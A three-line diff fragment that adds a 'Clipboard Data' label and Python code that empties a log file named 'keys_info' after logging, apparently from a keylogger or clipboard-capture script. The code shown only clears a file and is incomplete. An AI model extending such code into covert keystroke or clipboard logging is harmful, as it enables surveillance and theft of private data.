@@ -1,0 +1,3 @@
+Clipboard Data : 
+with open(file_path + keys_info,"w") as file: # reset file after logging
+            file.write("")
